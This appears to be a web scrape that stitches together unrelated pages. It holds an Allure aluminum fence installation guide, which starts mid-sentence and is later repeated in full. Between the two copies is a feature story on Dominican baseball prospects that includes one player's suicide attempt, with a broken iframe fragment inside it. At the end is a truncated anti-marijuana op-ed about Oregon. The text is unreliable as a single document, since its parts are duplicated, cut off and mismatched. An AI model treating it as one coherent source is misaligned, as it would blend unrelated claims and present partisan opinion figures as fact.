the same way it was attached to the gate posts.</p>    <p>If you plan to mount the hinge on a flat surface, you may need to modify the hinge post leafs so the hinge does not bind against the mounting surface. Mounting differs for other materials, such as wood or masonry. Contact a local building supply dealer and ask what fasteners they recommend for your mounting application. As a final step, test your gates to make sure there is a smooth, free swinging operation and install any latch hardware.</p>    <p>To take care of your Allure gate, lubricate the hinges using a graphite-based lubricant. Apply the lubricant at the top of each hinge on the fence and remove excess lubricant from painted surfaces as this may damage the treated surface and cause premature wear.</p>    <p>&#xa0;</p>    <h2>Drop Rods</h2>    <p>When mounting drop rod guides, position the guide roughly two inches from the bottom of the gate by drilling two 7/64&#x2033; holes and attaching the guide with two #6 x 1/2&#x2033; self-tapping screws. Attach the drop rod catch 20 inches above the bottom of the gate in the same way you attached the drop rod guide. Before you fasten the catch, use the drop rod to align the guide and catch. See Figure 9 below for a drop rod guide and catch installation diagram.</p>    <p>&#xa0;</p>    <p>Once your gate, gate posts, drop rod guide, and drop rod catch have been securely installed, it&#x2019;s time to finish the rest of the fence. The aluminum fencing sections will slot into pre-punched or self-cut holes on the fence posts. Secure, brace, and set concrete for the line, corner, and end posts in the same way you installed the gate posts. Finally, slot in each fencing section and attach it to its respective fence posts. Soon, an Allure aluminum fence will be the newest aesthetic accent to your property.</p>    <p>&#xa0;</p>    <h2>Maintaining Allure Aluminum Gates and Fences</h2>    <p>While aluminum fences are specially treated and relatively low maintenance compared to wrought iron and wood, they still require some care to last many years. Why not protect your investment with a little bit of basic maintenance? A few easy tips will help extend the life of your Allure aluminum gates and fences.</p>    <p>Gates:</p>    <ol>     <li>Be sure to check your gate daily to make sure it swings smoothly and latches properly. If necessary, lubricate or adjust the gate.</li>     <li>Make sure the gate is free of any debris or objects which may damage the latch or hinges.</li>     <li>Be sure to replace worn and damaged parts and check the gate&#x2019;s fasteners for tightness.</li>    </ol>    <p><strong>Note:</strong> As with all mechanical devices, hinges will experience age and wear. Proper lubrication, readjustment, and occasional replacement will be necessary to increase the life of your new Allure aluminum fence. When entering or exiting your fenced in area, be sure to check and verify the gate has been secured as wind or other obstructions may damage the gate if it is not properly latched.</p>    <p>Fences:</p>    <ol>     <li>If you live in an area where there is a yearly freeze and thaw cycle, it is a good idea to check and make sure the fence posts are secure and the concrete has not begun to crack.</li>     <li>If strong winds and storms are a problem in your area, it may also be a good idea to check posts and sections after large storms.</li>     <li>When mowing or edging, check to make sure the earth you&#x2019;ve piled on top of the concrete has not become too thin. If the concrete becomes exposed to weathering or is chipped by lawn equipment, it may degrade faster than if it remained buried.</li>     <li>Routinely inspect the fence line for damage to the aluminum. While aluminum is unlikely to chip, flake, or rust, it pays to be cautious. Replace any damaged sections, posts, and concrete when you have a chance.</li>    </ol>    <p>With these simple tips, you can extend the life of your Allure aluminum fencing materials indefinitely.</p>   </div>   </div>  
 a woman&#x2019;s hair, he begins scrolling down the website of fashion label Nautica. Moments later, the kid with the chinstrap beard pulls up a picture of a chrome-faced watch with a blue leather strap, and a set of smaller gauges.</p>      <p><em>&#x201c;Eeesstyle,&#x201d;</em> the 17-year-old says, hesitantly in English. &#x201c;It&#x2019;s $350. I&#x2019;m think I&#x2019;m going to buy it.&#x201d;</p>      <p>Coaches have warned Miguel about purchases like these. But sometimes, he says, it&#x2019;s hard not to treat himself.</p>      <p>On July 2, the 17-year-old inked a $100,000 minor league contract with the Blue Jays. A fourth of his signing bonus went to his coach, Augustine Ramos of the Neftali Cruz development league, where he was discovered. Fifty thousand dollars is being put away for his mother&#x2019;s new five-bedroom home in an upscale Santo Domingo neighborhood.</p>      <p>With the rest of the money, Miguel says he wants to buy himself a car &#x2013; something practical.</p>      <p>Maybe a Camry.</p>      <p><em>&#xa0;<strong>&#x2022;&#x2022;&#x2022;</strong></em></p>      <p><span>The first thing that strikes you about Gipsy Veras is his cleanly pressed Gucci polo, with red and green trimming on the sleeves and collar, conforming perfectly to a bulging chest, rounded belly, and toned arms. Stress pulls at the 35-year-old&#x2019;s drooping eyes, the lines running up his forehead and escaping onto a hairless scalp. He wears lime green fitted slacks. The links of his stainless steel wristwatch glimmer like the silver cross adorning his neck. Gipsy could not afford to buy the outfit he&#x2019;s wearing today.</span></p>      <p>The parallels between him and a 17-year-old on the other side of town are hard to ignore. Like Miguel, Gipsy signed a six-figure contract to play professionally as a teen. Like Miguel, he put a large chunk of his bonus money into a house for Mom. Like Miguel, he indulged in the latest fashions right away, constantly trying to outdo friends in the neighborhood.</p>      <p>Like Miguel, Gipsy was going to be famous.</p>      <p>Isn&#x2019;t everyone?</p>      <p>Gipsy&#x2019;s story is about poverty and wealth and how wealth can cause poverty all over again. It&#x2019;s about having nicer clothes than your teenage friends, the Nautica watch and Nikes, and doing favors &#x2013; 100 <em>pesos</em> here to buy lunch for a neighbor, another 500 there to pay his rent &#x2013; favors for everyone but yourself. It&#x2019;s a story about when dreams consume people, and swallow them whole. All while executives in tall buildings a country away, less than a 1,000 miles away, cash in on the successes of the lucky few, on the talent of your countrymen, mired in a limited economic system.</p>      <p>This is a story about sitting in your childhood bedroom and facing yourself once you&#x2019;ve lost everything.</p>      <p><span><iframe>&amp;amp;lt;a href=&quot;     <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Every day at 8 a.m., Miguel rolls out of bed and takes a long look in the mirror before baseball practice. He slips his mirrored sunglasses over his freshly cut three-quarter fade, kept perfect by weekly barbershop visits. He squirts Axe body spray onto his chest before throwing the can into his retro Toronto Blue Jays duffle bag.</span></p>      <p>After a breakfast of corn flakes, he leaves the house and heads for the metro station. In his Blue Jays cap and shirt, his Blue Jays shorts and his blue Nikes, the 17-year-old looks as if he&#x2019;s headed straight for the Rogers Centre. Actually, he&#x2019;s walking past <em>colmados</em>, the iconic Dominican street markets, passing a slew of check cashing shops and fruit stands and beggars on his way to <em>Centro Olimpico</em> baseball stadium, a field better known as the one-time playground of national heroes David &#x201c;Big Papi&#x201d; Ortiz, Sammy Sosa and Vladimir Guerrero.</p>      <p>Recently, Miguel says, something weird has been happening on his way to the train. People recognize him now, and they stop him.</p>      <p><em>&#x201c;Hola. Qu&#xe9; lo que?&#x201d;</em></p>      <p>He knows he shouldn&#x2019;t stop, but he likes the attention.</p>      <p>Until, &#x201c;They start talking, and talking for a while and they say, &#x2018;How&#x2019;s it going?&#x2019; Miguel says. &#x201c;And then they say, &#x2018;Bro, do you have 15,000 <em>pesos</em> you can lend me to take care of something?&#x2019; &#x201d;</p>      <p>At the baseball field he takes batting practice with Augustine Ramos, his longtime coach. Taking a hundred swings. Fielding dozens of groundballs. Throwing laser after laser to first from deep short.</p>      <p>Once, he bombed a meatball all the way to the adjacent bus station, clearing the 330-foot fence by a long shot and nearly landing on Avenida John F. Kennedy. Today, it&#x2019;s all line drives and fly balls, but Ramos doesn&#x2019;t mind. The coach says he wants four things out of his players:</p>      <ol>       <li>Speed</li>       <li>Arm strength</li>       <li>Intelligence</li>       <li>Height</li>      </ol>      <p>Miguel&#x2019;s got them down. He&#x2019;ll run a 6.5-second 60-yard dash when he leaves the academy in time for the MLB&#x2019;s Dominican Summer League in June. He can beam a one-hopper to first in a split second. His baseball IQ is above-average for someone his age, though he receives only four hours of schooling every week, well below the standard for American players. At 5-feet-11-inches, he almost has the same frame as Reyes, the current Blue Jays shortstop.</p>      <p>More than anything, Miguel hates when people doubt him.</p>      <p>One time last year, his manager in a select tournament put him at ninth in the batting order. Miguel threatened not to bat if he wasn&#x2019;t moved up. He even cried.</p>      <p>When he got up to the plate in the final inning, Miguel squared up, cocked his bat and launched a walk-off home run into the stands.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Gipsy beamed as they wrote the checks. Every Dominican boy wants to build his mom a new house.&#xa0;</span></p>      <p>After signing with the Tampa Bay Devil Rays in 1997, Gipsy decided to make good on a long-held vow: remodel his family home. It started out as two cement rooms in the <em>Para&#xed;so de Herrera </em>neighborhood, the kind of place a Santo Domingo cop and housewife raising four kids could afford. Only half the house was finished. There were blueprints for what the other side should look like, but the family didn&#x2019;t have enough money to make it livable.</p>      <p>Now, it&#x2019;s three stories, with a balcony overlooking the street, mahogany furniture and patterned sofas. Gipsy and Jose, now a $4 million per year relief pitcher for the Chicago Cubs, bought the family its first washing machine around the time of their signing.</p>      <p>&#x201c;I want a stove,&#x201d; their mother would say, and it&#x2019;d be there the next day.</p>      <p>The brothers must have poured $20,000 into the house.</p>      <p>Gipsy&#x2019;s spending didn&#x2019;t stop there. At parties, he&#x2019;d bring extra clothes along to ensure he was prepared if someone was dressed better than him. He was blowing through $100,000 like it was nothing, like it was replaceable.</p>      <p>All the while, he was splitting time between the United States and the Dominican Republic, trying to, at the very least, make it onto the High-A roster. His growth was impressing coaches in the Gulf Coast. His fastball had gone from 86 mph to 88 in a matter of months, then 90, 91 during the next few years.</p>      <p>In his mind, he was making it. Living his dream.</p>      <p>Then he got traded.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>A stack of boxes reaches almost to the ceiling in the family&#x2019;s living room, making the couch nearly unsittable. A dark hallway leads to the cramped kitchen, where the family&#x2019;s supply of cereals, bread, granola bars sits atop a yellowing fridge. Miguel&#x2019;s hole-in-the-wall room sits off to the side, next to the sliver that serves as the family bathroom. A spigot poking out of the wall serves as the family shower.</span></p>      <p>But soon, the Almontes will leave their cramped quarters for a five-bedroom house in another neighborhood. The kind of place where Negra has dreamed of opening a new salon for years. She opened her current one four years ago after her husband was laid off.</p>      <p>To save money before Miguel signed his contract, she says, she&#x2019;d go days at a time without eating. Miguel remembers a time she didn&#x2019;t eat for three whole days. Now, thanks in part to the salon carved out of the family garage, the Almontes are in better financial standing.</p>      <p>Standing over a torn up, black leather chair, she applies coloring to a woman&#x2019;s hair, trying to make conversation over the buzz of a fan on its highest setting. Miguel looks on from the armchair next to the salon&#x2019;s <b>iron</b> gate.</p>      <p>&#x201c;I don&#x2019;t want her to be here anymore.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>After saving his first game with the San Francisco Giants&#x2019; rookie league affiliate, Gipsy was convinced the move to Arizona would work out after all. But, he says, managers soon proved him wrong.</span></p>      <p>Just days after Gipsy arrived, he says, the scout who signed him began traveling on team business.</p>      <p>&#x201c;From then on, everything turned into a nightmare,&#x201d; Gipsy says.</p>      <p>He&#x2019;d go 20 days without playing, then the manager would send him into the game with no warm up. His fastball began to slow down. A searing pain shot up his right arm. He had no scout, no ally, to advocate for him. And he barely spoke English, which made it harder to defend himself.</p>      <p>But the man who says he was a Summer League leader in saves the year before didn&#x2019;t want to risk complaining. Those who complained might be dropped from the team a day after registering a win. It happened to Dominican players all the time. His brother Jose says Dominican players would routinely gather in hotels rooms and bawl their eyes out after seeing friends sent home.</p>      <p>Gipsy reached a point, he says, where no one believed in him anymore. Even Jose, who was well on his way to making the 40-man roster, says he stopped answering his brother&#x2019;s calls, not wanting to be distracted by negative thoughts.</p>      <p>Gipsy says prejudice factored into to the way he was treated.</p>      <p>&#x201c;The manager I got didn&#x2019;t treat me well,&#x201d; he says. &#x201c;It seemed like he didn&#x2019;t like Latino baseball players too much. He liked the baseball players, like they say, &#x2018;from the farm.&#x2019; &#x201d;</p>      <p>Now, Gipsy started feeling the pressure to inject.</p>      <p>&#x201c;I wanted to throw faster,&#x201d; he says. &#x201c;I wanted to compete with those above my level. And yes, it did cross my mind.&#x201d;</p>      <p>But then he began to think about the consequences, the embarrassment to his family.</p>      <p><em>&#x201c;Don&#x2019;t do it. It&#x2019;s going to turn out bad. You can die, you can get a heart attack.&#x201d;</em></p>      <p>He never did do steroids, he says, and his fastball lost a little more of its punch every day. Still, there were flashes of promise toward the end of his season in Arizona.</p>      <p>&#x201c;I remember I pitched six innings with no runs, six innings with no runs,&#x201d; Gipsy said.</p>      <p>He received the news a day later. Stormed out of the stadium still wearing his uniform. The flight was already arranged. Within 24 hours, he&#x2019;d be back on a plane to Santo Domingo.</p>      <p>&#x201c;The last one to find out is you.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Tomorrow, I go from being a normal baseball player to being a professional baseball player. A professional player.&#x201d;</em></p>      <p>The night before his signing, Miguel lies in bed picturing big league stadiums &#x2013;&#xa0;Rogers Centre, Fenway, Wrigley &#x2013; unable to sleep. Already imagining the stroke of the pen that would change his life.</p>      <p>&#x201c;I wanted to sign already,&#x201d; he said. &#x201c;I wanted to feel that joy already.&#x201d;</p>      <p>His trainers had informed him of the Blue Jays&#x2019; decision weeks before it was made official. But still, Miguel couldn&#x2019;t shake the possibilities from his mind. People were going to see him as a professional baseball player.</p>      <p>Ever since Neftali Cruz took him under his wing at 7, he&#x2019;d been working for this moment. He&#x2019;d devoted his life to baseball, and now it was finally paying off.</p>      <p>Only two years earlier, he&#x2019;d lie awake on this mattress, stomach growling, unable to sleep on an empty stomach.</p>      <p><em>&#x201c;A professional baseball player.&#x201d; </em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Farrell says the average career of a Dominican signee lasts between two and three years. He said there&#x2019;s weight on Dominican boys to succeed from birth, to lead their families out of poverty and be the salvation for entire villages and neighborhoods in the country. Those who don&#x2019;t succeed are immediately regarded as failures. The pressure on signees is immense.</span></p>      <p>&#x201c;There&#x2019;s a saying in Dominican baseball that &#x2018;If I don&#x2019;t succeed in baseball, the devil takes me away,&#x2019;&#x201d; Farrell said. &#x201c;It&#x2019;s like if their soul has been consumed. And you can see it in the eyes of some of these kids sometimes. You ask them, &#x2018;What are you going to the do with the rest of your life?&#x2019; And it&#x2019;s, &#x2018;I have no rest of my life. My life is over because I did not succeed in baseball.&#x2019; &#x201d;</p>      <p>If such a system were to be implemented in the United States, Farrell said, there&#x2019;d be mass paranoia. Nowhere else in sports is an industry solely based on the skills of 16-year-old kids. Nowhere else is exploitation so ingrained in the fabric of a sport.</p>      <p>&#x201c;You&#x2019;d have chaos if suddenly 13-, 14-year-olds were dropping out of school to become NBA players of NFL players,&#x201d; he said. &#x201c;It just would not happen.&#x201d;</p>      <p>Farrell says the sport destroys more than it saves.</p>      <p>Go to any taxi stand in the Dominican Republic and see for yourself, he says, the burly men lined up waiting to tell the stories of how their careers ended abruptly, without warning.</p>      <p>&#x201c;There&#x2019;s something fundamentally wrong with a system that tells you you&#x2019;re a failure at age 20.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>&#x201c;</span><i>You are not a baseball player anymore. You&#x2019;re nobody.&#x2019; &#x201d;</i></p>      <p>Now, back in his mother&#x2019;s home in Santo Domingo, a home his bonus check had expanded and remodeled, Veras laid in bed unresponsive. Saliva drenched his pillow.</p>      <p>He&#x2019;d spent the day&#x2019;s early hours locked in his bedroom, crying often, refusing food. Just getting out of bed seemed a monumental task. More than once, his mother came by to check on him.</p>      <p>&#x201c;Gipsy,&#x201d; she said, &#x201c;Gipsy. You have to eat something.&#x201d;</p>      <p>Gipsy remembered looking into the mirror, the feelings of failure as he made out the stocky figure reflected within it. Embarrassment overtook him. Shock.</p>      <p>Finally, he rose with sights set on his mother&#x2019;s medicine cabinet. He grabbed the first bottle he could find, retreating to his dark bedroom. One by one, he slipped the unmarked prescription pills into his mouth until he started feeling dizzy. He faded soon after the nausea set in.</p>      <p>Hours passed, and darkness fell on Santo Domingo, Gipsy lying there unnoticed.</p>      <p>Life in the pressure cooker of the Major League farm system had taken its toll. The pain in his right arm &#x2014; his pitching arm &#x2014; had become unbearable. The money that fueled weekend-long beach getaways in the northern Dominican Republic had long ago disappeared. Now, back home with no Major League contract, no education and no professional skills, Gipsy had nowhere to go. Baseball was his life for 15 years. He didn&#x2019;t know anything else.</p>      <p>He woke up. Confused, alive.</p>      <p>Days after his failed suicide attempt, he attended a church group with his close friend C&#xe9;sar. The group went out to eat, and everyone started talking about work. Except Gipsy.</p>      <p>&#x201c;They were all talking about their professions and I joked saying, &#x201c;So who&#x2019;s going to talk baseball with me?&#x201d;</p>      <p>&#x201c;No one.&#x201d;</p>      <p>It was like a joke, Gipsy said, no one cared to give attention to.</p>      <p>&#x201c;And it got me thinking. They were doctors, graduates, architects, medicine, lawyers&#x2026;</p>      <p><i>&#x201c;Oh, how are you doing at the university?&#x201d; </i></p>      <p><i>&#xa0;&#x201c;I&#x2019;m doing well.&#x201d; </i></p>      <p><i>&#x201c;Oh, I&#x2019;m in this university,&#x201d; </i></p>      <p><i>&#x201c;I&#x2019;m in this other one.&#x201d; </i></p>      <p>&#x201c;And so I asked myself, &#x2018;What are you?&#x2019; &#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p>Almonte and his mentor Neftali Cruz sit in the stands of an empty <i>Estadio Quisqueya</i>, talking baseball. Cruz has an arm around the 17-year-old. They&#x2019;re watching the Licey Tigers&#x2019; batting practice, looking on as minor leaguers and Dominican prospects and marginal major leaguers send longballs over the sea of Presidente ads making up the fence.</p>      <p>&#x201c;Carlos Beltran used to take 500 swings a day,&#x201d; Cruz tells him. &#x201c;Sosa took two hours of batting practice before every game.&#x201d;</p>      <p>Cruz, a Blue Jays scout who spent 14 years in the Pirates&#x2019; farm system, says he likes working with Dominican prospects because of their raw, unmatched desire to succeed.</p>      <p>&#x201c;When they&#x2019;re hungry,&#x201d; he says, &#x201c;they can learn. This game is repetition. You have to put in the brain. It&#x2019;s like going to school. You study before you take the test. Baseball is the same way. If you don&#x2019;t put in the mind, 50,000 people are going to be disappointed.&#x201d;</p>      <p>Later, Miguel stands and looks on as the Escogido Lions prepare for a 7 p.m. game. Standing in batter&#x2019;s eye relation to home plate, he begins listing off the Dominican MLB players he thinks have the best sounding names. Pedro Martinez. Robinson Cano. Albert Pujols.</p>      <p>Miguel grabs onto the backstop and leans into the net. He glances at the corners of the stadium, its 335-foot foul poles. Then he stares into the outfield, silent, imagining.</p>      <p>&#x201c;It&#x2019;s a good name for a baseball player,&#x201d; he says. &#x201c;Miguel Almonte.&#x201d;</p>      <p><em>(Tatiana Fernandez provided translations during the reporting of this story.

   <div>   <h1>How to Install Allure Aluminum Fence</h1>   <div>    <p>Allure is Home Depot&#x2019;s signature series of aluminum fences. Installing a fence is a long-term investment and can be expensive. By reading through these directions you can figure out whether Allure aluminum fence is the right choice for you before you buy any sections, posts, parts, or accessories. With a little preparation, the process can be a lot easier and you&#x2019;ll know exactly what you need to do to install a fence around your yard, pool, or business. The PDF we provide will be the basic installation manual offered by Home Depot. Although the PDF is incomplete, we provide the missing instructions for you, and a full installation manual should come with any fencing order. This page offers a similar layout and a few extra tips to make installation easier for you.</p>    <p><strong>Remember:</strong> When installing Allure aluminum fences, keep in mind local municipalities may require permits and have different zoning laws or require other special considerations before modifying your property. Even if your location does not, it is generally a good idea to be cautious and install the fence at least 2&#x201d; inside the property line. Additionally, utility companies may run power, gas, water, or other lines underground. Be sure to check with your local providers since these lines may run underground near where post holes would be dug along your planned fence line.</p>    <p>&#xa0;</p>    <h2>Fence Planning</h2>    <p>After you&#x2019;ve checked your local zoning laws and where utility lines may be running, it&#x2019;s time to get started. Before you order materials, you&#x2019;ll need to know how many aluminum fence sections, <b>gates</b>, posts, caps, and decorative accessories you&#x2019;ll need. If your property is relatively flat, you may be able to work with an accurate diagram of your property lines. If you don&#x2019;t have an accurate drawing of your property lines or plan to install fence sections on a slope, it may be best to go out and measure the fence line yourself.</p>    <p>Run strings along each side of the fence. This will help you get an accurate physical measurement for when you order materials. Also keep in mind that <b>gates</b> will need to be on level ground. As a general guideline, you will need a gate, line, or corner post for every section of fence and gate as well as two end posts. After you&#x2019;ve got a good diagram and figured out how many posts you&#x2019;ll need, you can order your materials. Home Depot may not have everything on-hand, so allow time for them to ship fencing supplies from their warehouse to your local store. You may also be responsible for delivering the fencing to your property when buying through Home Depot. The company does not offer installation, but does partner with local building companies for installations.</p>    <p>Once you&#x2019;ve gotten all the materials for your Allure fence, it&#x2019;s time to pick a day and gather your tools. Be sure to have either an auger or a post hole digger. If this is a do-it-yourself project, we recommend an auger, since post holers are less precise and are more physically taxing than mechanical and hydraulic augers. Nice weather is also important since it will make the work easier and cause fewer problems with the ground and concrete. Installing a fence can also be a lot of exercise and hard work if you&#x2019;ve never done it before. If you plan to complete your fencing project in a few days, it might be good to have a few extra people. You will need the following materials and tools to install your Allure fencing:</p>    <ul>     <li>Aluminum fencing sections, posts, <b>gates</b>, and decorative accents</li>     <li>Concrete</li>     <li>Measuring tape</li>     <li>A way to mark where fence posts will be placed</li>     <li>An auger or a post hole digger</li>     <li>A hack saw or circular saw</li>     <li>A rubber mallet</li>     <li>A screw driver and</li>     <li>A power drill</li>    </ul>    <p>The first step when installing your fence is to dig post holes. If you plan to complete the project in a single day, it may help to dig all the post holes before mixing concrete or installing any fencing sections. If you plan to install the fence over the course of several days or a week, you may want to dig holes for the posts and number of sections you plan to install that day. Digging post holes more than a day in advance runs the risk of having rain or other environmental factors to damage the holes.</p>    <p>Gate posts are generally manufactured with extra aluminum alloy and have a thicker wall, so they are stronger and sturdier than line, corner, and end posts. As such, installing the gate is a good place to begin. To start, dig post holes about 3&#x2033; to 4&#x2033; wider than the gate on centers. Next, Home Depot&#x2019;s directions recommend that, for Allure aluminum fences, you do not install more than one gate per fence section to be installed. You can always install more <b>gates</b> when you reach that point in the fence line.</p>    <p><strong>Be Careful! </strong>If you live in an area where ground frost occurs, the frost could extend into the concrete beneath your fence posts and cause the concrete to crack and destabilize the fence posts. The best course of action is to dig below where the frost reaches and extend the concrete to this depth. For example, you may need to dig deeper in North Dakota than Ohio. If you&#x2019;re installing fences in Arizona, this likely won&#x2019;t even be a concern. Local zoning laws may also specify a minimum or maximum depth for the concrete in post holes. Be sure to check with your local municipality before installation.</p>    <p>&#xa0;</p>    <h2>Installing Fence Posts</h2>    <p>Once the post holes are dug and the post is in an upright position, set the concrete at roughly 4&#x2033; below the ground&#x2019;s surface so grass can grow over the post hole.&#xa0; For easier lawn maintenance, set the concrete at 2&#x2033; &#x2013; 3&#x2033;. It is also recommended that if you are installing an aluminum pool fence, you use a maximum depth of 2&#x2033;. Keep in mind that pre-punched posts must be facing the correct way to install fencing sections. Line posts are punched on opposite sides, corner posts on adjacent, and end posts on only a single side.</p>    <p>When installing fence post caps, use a rubber mallet to avoid damaging the post cap or moving the post as the concrete sets. Although it helps to use a rubber mallet, the hammer could still damage the post caps, so use caution when installing the caps. See Figures 2 and 3 for diagrams on post and post cap installation for Allure aluminum fences.</p>    <p>&#xa0;</p>    <p>When installing a single gate, set the gate opening 1&#x2033; wider than the actual measurement of the gate. As an example, Allure&#x2019;s 48&#x2033; <b>gates</b> actually measure 47&#x2033; wide and the gate opening will need to be 48&#x2033; wide. For further information, see Figure 4. When installing a double drive gate, gate openings must be 2&#x2033; wider than gate width to accommodate the extra gate. For example, two 48&#x2033; <b>gates</b> will actually measure 94&#x2033; and require an additional 2&#x2033; during installation, totaling 96&#x2033;.&#xa0; For an installation diagram of a double gate, see Figure 5.</p>    <p><strong>Note</strong>: When installing gate posts, note the direction the post is facing. Some aluminum fence posts have pre-punched holes. This means the left gate post may differ from the right gate post and the hinge post holes will be on opposite sides. This will impact which direction the gate swings. Keep this in mind when positioning gate posts. Allure gate posts usually do not have pilot holes, so you will likely need a power drill when installing your gate.</p>    <p>Next, fill the post holes with a stiff concrete mix and ensure that the concrete extends below the bottom of the post to create a solid foundation. This is especially important when installing <b>gates</b>. Brace the posts as necessary to keep them upright and straight while the concrete sets. The aluminum fence slots must be facing the correct direction, once the concrete sets, there will not be a way to change this.</p>    <p>&#xa0;</p>    <h2>Gate Installation</h2>    <p><strong>Warning:</strong> Do not install the gate before aligning the gate posts and the concrete sets. Gate posts are manufactured with more aluminum because they must handle the additional weight of the gate. Hanging the gate before the concrete sets could cause the fence posts to settle at an angle and cause problems with the remaining fencing sections.</p>    <p>Once the gate posts have been installed and the concrete sets, you can hang the gate. Remember, <b>gates</b> must be installed on level ground. Next, position the hinges as far apart as you can on the gate for maximum stability and clamp the hinge post leaf to the gate post. Position the hinge post leaf completely flush and plumb against the fence post and gate to avoid binding. See Figure 6 below.</p>    <p>&#xa0;</p>    <p>Now, attach the hinges to the post by drilling 7/64&#x2033; pilot holes and fastening with screws provided. Again, remember that the gate will swing based on the side of the gate post where you drill the pilot holes, so be sure to drill facing the direction you want the gate to swing in. Once the pilot holes have been drilled, center the gate over the pilot holes and attach it to the gate the same way it was attached to the gate posts.</p>    <p>If you plan to mount the hinge on a flat surface, you may need to modify the hinge post leafs so the hinge does not bind against the mounting surface. Mounting differs for other materials, such as wood or masonry. Contact a local building supply dealer and ask what fasteners they recommend for your mounting application. As a final step, test your <b>gates</b> to make sure there is a smooth, free swinging operation and install any latch hardware.</p>    <p>To take care of your Allure gate, lubricate the hinges using a graphite-based lubricant. Apply the lubricant at the top of each hinge on the fence and remove excess lubricant from painted surfaces as this may damage the treated surface and cause premature wear.</p>    <p>&#xa0;</p>    <h2>Drop Rods</h2>    <p>When mounting drop rod guides, position the guide roughly two inches from the bottom of the gate by drilling two 7/64&#x2033; holes and attaching the guide with two #6 x 1/2&#x2033; self-tapping screws. Attach the drop rod catch 20 inches above the bottom of the gate in the same way you attached the drop rod guide. Before you fasten the catch, use the drop rod to align the guide and catch. See Figure 9 below for a drop rod guide and catch installation diagram.</p>    <p>&#xa0;</p>    <p>Once your gate, gate posts, drop rod guide, and drop rod catch have been securely installed, it&#x2019;s time to finish the rest of the fence. The aluminum fencing sections will slot into pre-punched or self-cut holes on the fence posts. Secure, brace, and set concrete for the line, corner, and end posts in the same way you installed the gate posts. Finally, slot in each fencing section and attach it to its respective fence posts. Soon, an Allure aluminum fence will be the newest aesthetic accent to your property.</p>    <p>&#xa0;</p>    <h2>Maintaining Allure Aluminum <b>Gates</b> and Fences</h2>    <p>While aluminum fences are specially treated and relatively low maintenance compared to wrought <b>iron</b> and wood, they still require some care to last many years. Why not protect your investment with a little bit of basic maintenance? A few easy tips will help extend the life of your Allure aluminum <b>gates</b> and fences.</p>    <p><b>Gates</b>:</p>    <ol>     <li>Be sure to check your gate daily to make sure it swings smoothly and latches properly. If necessary, lubricate or adjust the gate.</li>     <li>Make sure the gate is free of any debris or objects which may damage the latch or hinges.</li>     <li>Be sure to replace worn and damaged parts and check the gate&#x2019;s fasteners for tightness.</li>    </ol>    <p><strong>Note:</strong> As with all mechanical devices, hinges will experience age and wear. Proper lubrication, readjustment, and occasional replacement will be necessary to increase the life of your new Allure aluminum fence. When entering or exiting your fenced in area, be sure to check and verify the gate has been secured as wind or other obstructions may damage the gate if it is not properly latched.</p>    <p>Fences:</p>    <ol>     <li>If you live in an area where there is a yearly freeze and thaw cycle, it is a good idea to check and make sure the fence posts are secure and the concrete has not begun to crack.</li>     <li>If strong winds and storms are a problem in your area, it may also be a good idea to check posts and sections after large storms.</li>     <li>When mowing or edging, check to make sure the earth you&#x2019;ve piled on top of the concrete has not become too thin. If the concrete becomes exposed to weathering or is chipped by lawn equipment, it may degrade faster than if it remained buried.</li>     <li>Routinely inspect the fence line for damage to the aluminum. While aluminum is unlikely to chip, flake, or rust, it pays to be cautious. Replace any damaged sections, posts, and concrete when you have a chance.</li>    </ol>    <p>With these simple tips, you can extend the life of your Allure aluminum fencing materials indefinitely.</p>   </div>   </div>

   <div>   <i>California let's change our state! Please tell others about Stop Pot 2016!</i>    <p><em>By Shirley Morgan</em> As the founder of the , a national volunteer outreach with a focus on the impacts of marijuana in our communities, I want to convey loud and clear that the recent decision by Oregon&#x2019;s legislature to redefine marijuana as an agricultural crop should not be ignored!&#xa0;&#xa0; </p>   <p>Marijuana advocates and pro-marijuana legislators are outright trying to takeover Oregon&#x2019;s rural farming communities for the sole purpose of growing recreational marijuana. They have done this by redefining marijuana as an agricultural crop through House Bill 3400. This happened because in Oregon medical marijuana program was set up as a bridge to marijuana legalization; then out-of-state donors funded legalization; the vote passed and the legislature redefined marijuana as an agricultural farm crop.</p>   <p>First, recreational marijuana was legalized in Oregon in 2014 under a statutory ballot measure that was funded by a $5.3 million dollar out-of-state campaign. Marijuana lobbyists and pro-marijuana legislators waited with bated breath to see if polling guidelines around the public&#x2019;s acceptance of a tax and regulate scheme would pass. It passed 55.6%, yes and a 44.4% no! It was the urban voters who said yes and rural voters who said no, yet it will be the rural voters who will be most impacted by marijuana legalization in Oregon.</p>   <p>Advocates of Measure 91 blasted the airwaves with their message knowing that local efforts would have a difficult time matching their out-of-state financial efforts, since all of their money was coming in from the billionaires whose dream is to legalize all illegal drugs, therefore making it difficult for the general public to hear the real truth about the dangerous impacts of marijuana.</p>   <p>Second, according to the Oregon Health Authority there are over 47,430 unregulated medical marijuana growers growing for cardholders. The Oregon Liquor License Commission was given the task to set up rules for Oregon&#x2019;s new marijuana program. That commission has indicated that at least 75% of the medical marijuana in Oregon goes to the underage and out-of-state black market. So legislators went to work to find ways to control Oregon&#x2019;s medical marijuana program by reducing the number of cardholders that each medical marijuana growers may provide for and reducing the number of marijuana plants that could be grown at one site address. If they couldn&#x2019;t reduce these quantities, then Oregon&#x2019;s new recreational marijuana would have a difficult time surviving. From the beginning, controlling medical marijuana was the tool that was used by the pro marijuana advocates to set the foundation for full and outright marijuana legalization.</p>   <p>Third, once the marijuana legislators realized that the marijuana legalization program was only going to succeed if they were able to curtail the current unregulated medical marijuana program, they opened the door to the growers by developing what they called an Opt In program for growers where they could sell their extra marijuana to the recreational marijuana market. However, it was not a mandate for the 47,430 unregulated marijuana grow sites to become part of this program, leaving another unregulated loophole.</p>   <p>Finally, Oregon&#x2019;s legislators decided to redefine marijuana as an agricultural farm crop under House Bill 3400 (section 34 (1), which gives recreational marijuana grows an immunity loophole in all of Oregon&#x2019;s exclusive farm use areas under the States &#x201c;Right to Farm Act.&#x201d; This bill denies 